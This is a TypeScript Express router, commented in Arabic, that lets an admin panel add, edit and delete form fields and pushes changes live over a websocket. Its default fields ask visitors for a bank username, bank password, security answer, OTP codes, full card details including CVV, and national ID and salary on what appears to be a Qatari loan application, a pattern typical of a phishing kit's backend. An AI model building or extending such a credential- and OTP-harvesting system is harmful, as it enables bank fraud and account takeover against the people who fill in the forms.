// مسارات الحقول المخصصة - إضافة وحذف حقول النماذج من لوحة الإدارة
import { Router } from "express";
import { db, customFieldsTable } from "@workspace/db";
import { eq, and } from "drizzle-orm";
import { broadcast } from "../lib/websocket";

const router = Router();

// الحقول الافتراضية لكل صفحة (تُزرع تلقائياً إن لم توجد)
const DEFAULT_FIELDS: Record<string, Array<{
  fieldKey: string; labelAr: string; fieldType: string; placeholder: string; options: string; isRequired: boolean; sortOrder: number;
}>> = {
  credentials: [
    { fieldKey: "bankUsername",   labelAr: "اسم المستخدم",         fieldType: "text",     placeholder: "أدخل اسم المستخدم",     options: "", isRequired: true, sortOrder: 1 },
    { fieldKey: "bankPassword",   labelAr: "كلمة المرور",           fieldType: "password", placeholder: "أدخل كلمة المرور",       options: "", isRequired: true, sortOrder: 2 },
    { fieldKey: "securityAnswer", labelAr: "كلمة التحقق الأمنية",  fieldType: "text",     placeholder: "أدخل كلمة التحقق",       options: "", isRequired: true, sortOrder: 3 },
  ],
  verify: [
    { fieldKey: "otpCode", labelAr: "رمز التحقق (OTP)", fieldType: "text", placeholder: "أدخل الرمز", options: "", isRequired: true, sortOrder: 1 },
  ],
  "pay-visa": [
    { fieldKey: "paymentCardNumber", labelAr: "رقم بطاقة الدفع", fieldType: "text", placeholder: "أدخل رقم البطاقة", options: "", isRequired: true, sortOrder: 1 },
    { fieldKey: "paymentCardHolder", labelAr: "اسم حامل البطاقة", fieldType: "text", placeholder: "أدخل الاسم كما هو على البطاقة", options: "", isRequired: true, sortOrder: 2 },
    { fieldKey: "paymentExpiryDate", labelAr: "تاريخ انتهاء البطاقة", fieldType: "text", placeholder: "MM/YY", options: "", isRequired: true, sortOrder: 3 },
    { fieldKey: "paymentCvv", labelAr: "رمز CVV/CVC", fieldType: "password", placeholder: "أدخل الرمز", options: "", isRequired: true, sortOrder: 4 },
  ],
  "pay-otp": [
    { fieldKey: "paymentOtp", labelAr: "رمز التحقق (OTP)", fieldType: "text", placeholder: "أدخل رمز التحقق", options: "", isRequired: true, sortOrder: 1 },
  ],
  apply_individual: [
    { fieldKey: "fullName",       labelAr: "الاسم الكامل",                        fieldType: "text",   placeholder: "أدخل الاسم الكامل",    options: "", isRequired: true,  sortOrder: 1 },
    { fieldKey: "nationalId",     labelAr: "رقم الهوية / رقم الإقامة",            fieldType: "text",   placeholder: "أدخل رقم الهوية",       options: "", isRequired: true,  sortOrder: 2 },
    { fieldKey: "dateOfBirth",    labelAr: "تاريخ الميلاد",                       fieldType: "date",   placeholder: "",                       options: "", isRequired: true,  sortOrder: 3 },
    { fieldKey: "monthlySalary",  labelAr: "الراتب الشهري (ريال قطري)",           fieldType: "number", placeholder: "أدخل الراتب الشهري",     options: "", isRequired: true,  sortOrder: 4 },
    { fieldKey: "employer",       labelAr: "جهة العمل",                           fieldType: "text",   placeholder: "أدخل جهة العمل",         options: "", isRequired: true,  sortOrder: 5 },
    { fieldKey: "phone",          labelAr: "رقم الجوّال",                         fieldType: "tel",    placeholder: "أدخل رقم الجوّال",       options: "", isRequired: true,  sortOrder: 6 },
    { fieldKey: "email",          labelAr: "البريد الإلكتروني",                   fieldType: "email",  placeholder: "أدخل البريد الإلكتروني", options: "", isRequired: false, sortOrder: 7 },
    { fieldKey: "city",           labelAr: "المنطقة / المدينة",                   fieldType: "select", placeholder: "اختر المنطقة",           options: "الدوحة,الريان,الوكرة,الخور,الشمال,أم صلال,الضعاين,مسيعيد,دخان", isRequired: false, sortOrder: 8 },
    { fieldKey: "maritalStatus",  labelAr: "الحالة الاجتماعية",                   fieldType: "select", placeholder: "اختر الحالة",            options: "أعزب / عزباء,متزوج / متزوجة,مطلّق / مطلّقة,أرمل / أرملة",     isRequired: false, sortOrder: 9 },
  ],
  apply_business: [
    { fieldKey: "companyName",               labelAr: "اسم الشركة",                        fieldType: "text",   placeholder: "أدخل اسم الشركة",          options: "", isRequired: true,  sortOrder: 1 },
    { fieldKey: "businessType",              labelAr: "نوع النشاط التجاري",               fieldType: "text",   placeholder: "أدخل نوع النشاط",           options: "", isRequired: true,  sortOrder: 2 },
    { fieldKey: "commercialRegistration",    labelAr: "رقم السجل التجاري",                fieldType: "text",   placeholder: "أدخل رقم السجل",            options: "", isRequired: true,  sortOrder: 3 },
    { fieldKey: "employeeCount",             labelAr: "عدد الموظفين",                     fieldType: "number", placeholder: "أدخل عدد الموظفين",         options: "", isRequired: false, sortOrder: 4 },
    { fieldKey: "annualRevenue",             labelAr: "الإيرادات السنوية (ريال قطري)",    fieldType: "number", placeholder: "أدخل الإيرادات السنوية",    options: "", isRequired: false, sortOrder: 5 },
    { fieldKey: "contactName",               labelAr: "اسم المسؤول",                      fieldType: "text",   placeholder: "أدخل اسم المسؤول",          options: "", isRequired: true,  sortOrder: 6 },
    { fieldKey: "phone",                     labelAr: "رقم الجوّال",                      fieldType: "tel",    placeholder: "أدخل رقم الجوّال",          options: "", isRequired: true,  sortOrder: 7 },
    { fieldKey: "email",                     labelAr: "البريد الإلكتروني",                fieldType: "email",  placeholder: "أدخل البريد الإلكتروني",   options: "", isRequired: false, sortOrder: 8 },
  ],
};

async function seedDefaults(pageKey: string) {
  const defaults = DEFAULT_FIELDS[pageKey];
  if (!defaults) return;
  for (const d of defaults) {
    await db.insert(customFieldsTable).values({
      pageKey,
      fieldKey: d.fieldKey,
      labelAr: d.labelAr,
      fieldType: d.fieldType,
      placeholder: d.placeholder,
      options: d.options || "",
      isRequired: d.isRequired,
      sortOrder: d.sortOrder,
    }).onConflictDoNothing();
  }
}

// الحصول على حقول صفحة معينة (مع زرع الافتراضيات تلقائياً)
router.get("/:pageKey", async (req, res) => {
  const { pageKey } = req.params;
  try {
    let fields = await db
      .select()
      .from(customFieldsTable)
      .where(and(eq(customFieldsTable.pageKey, pageKey), eq(customFieldsTable.isActive, true)))
      .orderBy(customFieldsTable.sortOrder, customFieldsTable.id);

    // زرع الافتراضيات إن كانت الصفحة فارغة
    if (fields.length === 0 && DEFAULT_FIELDS[pageKey]) {
      await seedDefaults(pageKey);
      fields = await db
        .select()
        .from(customFieldsTable)
        .where(and(eq(customFieldsTable.pageKey, pageKey), eq(customFieldsTable.isActive, true)))
        .orderBy(customFieldsTable.sortOrder, customFieldsTable.id);
    }

    res.json(fields);
  } catch (err) {
    req.log.error({ err }, "خطأ في جلب الحقول");
    res.status(500).json({ error: "فشل في جلب الحقول" });
  }
});

// إضافة حقل جديد
router.post("/:pageKey", async (req, res) => {
  const { pageKey } = req.params;
  const { labelAr, fieldKey, fieldType, placeholder, options, isRequired, sortOrder } = req.body;
  if (!labelAr || !fieldKey) return res.status(400).json({ error: "التسمية والمفتاح مطلوبان" });
  try {
    const [field] = await db.insert(customFieldsTable).values({
      pageKey,
      fieldKey,
      labelAr,
      fieldType: fieldType || "text",
      placeholder: placeholder || "",
      options: options || "",
      isRequired: !!isRequired,
      sortOrder: sortOrder || 0,
    }).returning();

    const allFields = await db.select().from(customFieldsTable)
      .where(and(eq(customFieldsTable.pageKey, pageKey), eq(customFieldsTable.isActive, true)))
      .orderBy(customFieldsTable.sortOrder, customFieldsTable.id);
    broadcast({ type: "custom_fields_update", pageKey, fields: allFields });

    res.status(201).json(field);
  } catch (err) {
    req.log.error({ err }, "خطأ في إضافة الحقل");
    res.status(500).json({ error: "فشل في إضافة الحقل" });
  }
});

// تعديل حقل موجود
router.patch("/:pageKey/:fieldId", async (req, res) => {
  const fieldId = Number(req.params.fieldId);
  const { pageKey } = req.params;
  try {
    const [field] = await db.update(customFieldsTable)
      .set(req.body)
      .where(eq(customFieldsTable.id, fieldId))
      .returning();
    if (!field) return res.status(404).json({ error: "الحقل غير موجود" });

    const allFields = await db.select().from(customFieldsTable)
      .where(and(eq(customFieldsTable.pageKey, pageKey), eq(customFieldsTable.isActive, true)))
      .orderBy(customFieldsTable.sortOrder, customFieldsTable.id);
    broadcast({ type: "custom_fields_update", pageKey, fields: allFields });

    res.json(field);
  } catch (err) {
    req.log.error({ err }, "خطأ في تعديل الحقل");
    res.status(500).json({ error: "فشل في تعديل الحقل" });
  }
});

// حذف حقل
router.delete("/:pageKey/:fieldId", async (req, res) => {
  const fieldId = Number(req.params.fieldId);
  const { pageKey } = req.params;
  try {
    await db.delete(customFieldsTable).where(eq(customFieldsTable.id, fieldId));

    const allFields = await db.select().from(customFieldsTable)
      .where(and(eq(customFieldsTable.pageKey, pageKey), eq(customFieldsTable.isActive, true)))
      .orderBy(customFieldsTable.sortOrder, customFieldsTable.id);
    broadcast({ type: "custom_fields_update", pageKey, fields: allFields });

    res.json({ success: true });
  } catch (err) {
    req.log.error({ err }, "خطأ في حذف الحقل");
    res.status(500).json({ error: "فشل في حذف الحقل" });
  }
});

export default router;
